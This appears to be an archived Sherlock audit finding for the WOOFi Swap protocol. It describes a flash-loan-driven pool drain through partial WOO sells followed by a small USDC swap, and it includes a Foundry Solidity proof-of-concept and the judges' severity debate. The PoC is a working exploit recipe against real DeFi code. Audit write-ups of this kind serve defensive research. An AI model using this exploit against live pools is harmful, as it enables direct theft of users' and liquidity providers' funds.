---
tags:
  - blockchain/evm
  - blockchain/evm/polygon
  - blockchain/evm/zksync
  - lang/solidity
  - sector/dex
  - sector/gaming
  - sector/oracle
  - sector/stable
  - sector/token
  - sector/zk
  - platform/sherlock
  - has/github
  - has/poc
  - severity/high
  - impact/loss-of-funds/direct-drain
  - trigger/flash-loan
  - precondition/flash-loan-available
protocol: "[[WOOFi]]"
auditors:
  - "[[mstpr-brainbot]]"
report: "https://github.com/sherlock-audit/2024-03-woofi-swap-judging"
genome:
  - "[[missing-circuit-breaker]]"
  - "[[direct-drain]]"
  - "[[flash-loan]]"
  - "[[flash-loan-available]]"
  - "[[chainlink-round-completeness]]"
  - "[[flashloan-callback-auth]]"
---
# H-1: Pool can be drained

- id: 31886
- impact: HIGH
- protocol: [[WOOFi]] Swap
- reporter: mstpr-brainbot (Sherlock)
- source: N/A

## Summary


This bug report discusses a vulnerability found in the protocol that allows the pool to be drained, similar to a previous incident. The vulnerability was discovered by mstpr-brainbot and it is caused by the `maxNotionalSwap` and `maxGamma` functions not preventing the pool from being drained. This allows for an attack where a user can take out a flashloan of 99_990 WOO and sell it partially in 10 pieces, getting 199_779 WOO in return. This attack has been successfully tested and the code snippet is provided. The impact of this vulnerability is significant and the severity has been escalated to High. The tool used for this report was manual review and the recommendation is to handle tokens without a Chainlink price feed differently. There was some discussion about whether tokens without a Chainlink price feed would be used in the system, but it was ultimately decided that this vulnerability is valid and High severity. 

## Details

Source: https://github.com/sherlock-audit/2024-03-woofi-swap-judging/issues/68 

The protocol has acknowledged this issue.

## Found by 
mstpr-brainbot
## Summary
The pool can be drained just as it was during the incident that occurred previously.
## Vulnerability Detail
`maxNotionalSwap` and `maxGamma` and the new math formula do not prevent the pool being drainable. Same attack vector that happent previously is still applicable:
https://woo.org/blog/en/woofi-spmm-exploit-post-mortem
https://rekt.news/woo-rekt/

Flashloan 99989999999999999990000 (99_990) WOO
Sell WOO partially (in 10 pieces) assuming maxGamma | maxNotionalSwap doesnt allow us to do it in one go
Sell 20 USDC and get 199779801821639475527975 (199_779) WOO
Repay flashloan, pocket the rest of the 100K WOO.

**Coded PoC:**
```solidity
function test_Exploit() public {
        // Flashloan 99989999999999999990000 (99_990) WOO
        // Sell WOO partially (in 10 pieces) assuming maxGamma | maxNotionalSwap doesnt allow us to do it in one go
        // Sell 20 USDC and get 199779801821639475527975 (199_779) WOO
        // Repay flashloan, pocket the rest of the 100K WOO. 

        // Reference values: 
        // s = 0.1, p = 1, c = 0.0001 

        // bootstrap the pool 
        uint usdcAmount = 100_0000_0_0000000000000_000;
        deal(USDC, ADMIN, usdcAmount);
        deal(WOO, ADMIN, usdcAmount);
        deal(WETH, ADMIN, usdcAmount);
        vm.startPrank(ADMIN);
        IERC20(USDC).approve(address(pool), type(uint256).max);
        IERC20(WOO).approve(address(pool), type(uint256).max);
        IERC20(WETH).approve(address(pool), type(uint256).max);
        pool.depositAll(USDC);
        pool.depositAll(WOO);
        pool.depositAll(WETH);
        vm.stopPrank();
        ////////////////////////

        // fund mr TAPIR
        vm.startPrank(TAPIR);
        uint wooAmountForTapir = 9999 * 1e18 - 1000;
        deal(WOO, TAPIR, wooAmountForTapir * 10);
        IERC20(USDC).approve(address(router), type(uint256).max);
        IERC20(WOO).approve(address(router), type(uint256).max);
        IERC20(WETH).approve(address(router), type(uint256).max);
        vm.stopPrank();
        ////////////////////////
        
        // get the price before the swaps
        (uint128 price, ) = oracle.woPrice(WOO);
        console.log("Price before the swap", price);

        // here, we assume maxGamma and maxNotionalSwap can save us. However, due to how AMM behaves
        // partial swaps in same tx will also work and it will be even more profitable! 
        uint cumulative;
        for (uint i; i < 10; ++i) {
            vm.prank(TAPIR);
            cumulative += router.swap(WOO, USDC, wooAmountForTapir, 0, payable(TAPIR), TAPIR);
        }

        // how much we bought and what's the final swap? 
        console.log("USDC bought after swaps", cumulative);
        (price, ) = oracle.woPrice(WOO);
        console.log("Price after swap", price);

        // sell 20 USDC, how much WOO we get? (199779801821639475527975)
        vm.prank(TAPIR);
        uint receivedWOO = router.swap(USDC, WOO, 20 * 1e6, 0, payable(TAPIR), TAPIR);
        console.log("Received WOO", receivedWOO); // 199779801821639475527975 (10x)
        console.log("Total WOO flashloaned", wooAmountForTapir * 10); // 99989999999999999990000

        // attack is succesfull 
        assertGe(receivedWOO, wooAmountForTapir * 10);
    }
```
## Impact

## Code Snippet
https://github.com/sherlock-audit/2024-03-woofi-swap/blob/65185691c91541e33f84b77d4c6290182f137092/WooPoolV2/contracts/WooPPV2.sol#L420-L465
## Tool used

Manual Review

## Recommendation



## Discussion

**fb-alexcq**


This extreme price-deviation case has already been handled by price check (against Chainlink) in our Wooracle's price function.



**mstpr**

@fb-alexcq 
correct, but some tokens like WOO does not have chainlink price feeds in other networks, in that case the attack is feasible

**fb-alexcq**

Thanks for the feedback. 

We already decided to never support any token which are unavailable in Chainlink, right after we got exploited a month ago. And this is the only way to fix it; otherwise, the project cannot run again.

**WangSecurity**

The info about not using tokens that don't have Chainlink price feeds is not in README. Moreover, the README says any standard token. Therefore, aproppriate severity is High.

**WangSecurity**

I've consulted on this issue with the Head of Judging and decided to invalidate it, since such tokens wouln't be used. The README says "any" ERC20 token, therefore, it's expected tokens without the any weird traits will be used.

**mstpr**

Escalate

Every ERC20 can be used, tokens that does not have a a chainlink price feed set is not considered as "weird" tokens as per Sherlock:
https://github.com/d-xo/weird-erc20

Also, the current scope of contracts indeed assumes that there can be tokens used that does not have chainlink price feeds
https://github.com/sherlock-audit/2024-03-woofi-swap/blob/65185691c91541e33f84b77d4c6290182f137092/WooPoolV2/contracts/wooracle/WooracleV2_2.sol#L247-L255

Additionally, the README does not states that tokens that have no chainlink oracle will not be used. Though, this would be contradictory anyways since the current code has an extra logic to handle tokens without the chainlink price feed.

Also, the deployed chains are as follows in README:
Arbitrum, Optimism, Base, Avalanche, BSC, Polygon PoS, Mantle, Fantom, Polygon zkEVM, zkSync, Linea
There are lots of tokens that does not have chainlink price feed and have very high liquidity on some of them. For example, the WOO token has no price feeds, SOL token doesn't have price feed in Linea, zkSyncEVM, MATIC token doesn't have price feed in Linea, Scroll, Base etc. 

Considering how serious the issue is and the above, this issue should be definitely considered as a high issue.

**sherlock-admin2**

> Escalate
> 
> Every ERC20 can be used, tokens that does not have a a chainlink price feed set is not considered as "weird" tokens as per Sherlock:
> https://github.com/d-xo/weird-erc20
> 
> Also, the current scope of contracts indeed assumes that there can be tokens used that does not have chainlink price feeds
> https://github.com/sherlock-audit/2024-03-woofi-swap/blob/65185691c91541e33f84b77d4c6290182f137092/WooPoolV2/contracts/wooracle/WooracleV2_2.sol#L247-L255
> 
> Additionally, the README does not states that tokens that have no chainlink oracle will not be used. Though, this would be contradictory anyways since the current code has an extra logic to handle tokens without the chainlink price feed.
> 
> Also, the deployed chains are as follows in README:
> Arbitrum, Optimism, Base, Avalanche, BSC, Polygon PoS, Mantle, Fantom, Polygon zkEVM, zkSync, Linea
> There are lots of tokens that does not have chainlink price feed and have very high liquidity on some of them. For example, the WOO token has no price feeds, SOL token doesn't have price feed in Linea, zkSyncEVM, MATIC token doesn't have price feed in Linea, Scroll, Base etc. 
> 
> Considering how serious the issue is and the above, this issue should be definitely considered as a high issue.

You've created a valid escalation!

To remove the escalation from consideration: Delete your comment.

You may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.

**WangSecurity**

Agree with everything that tapir says above, but want to note that I've consulted with the head of judging before making this decision. But, I agree that I may have phrased the problem not very clearly and will send what I've said to the head of judging about it.

My message: "in some issues the problem is that tokens don't have chainlink's price feed, but the sponsor says they will only use tokens with the feeds."

The head of judging said this doesn't sound like a vulnerability.

After that I also added: "oh, sorry, I missed for the first one, it allowed to drain the entire pool, but still it required to whitelist tokens without the price feed, which they didn't intend to do." and head of judging is reacted with a thumbs up emoji.

I don't say that tapir is wrong and agree with his reasons, therefore, I will accept it decision from the head of judging. Just wanted to note why it's invalidated.


**Czar102**

I think the fact that there are special fragments of code to handle the no oracle cases is a game-changer in this judgment. Without that detail, this would clearly be an admin misconfiguration, but it seems that tokens without a Chainlink feed were intended (or allowed) to be used.

Given that it wasn't noted anywhere (to my best knowledge) that this fragment of the code will never be used, i.e. all whitelisted tokens will have a Chainlink feed, I am planning to consider this a valid High severity issue. 

**WangSecurity**

Great issue @mstpr !

**Czar102**

Result:
High
Unique

**sherlock-admin3**

Escalations have been resolved successfully!

Escalation status:
- [mstpr](https://github.com/sherlock-audit/2024-03-woofi-swap-judging/issues/68/#issuecomment-2039575831): accepted
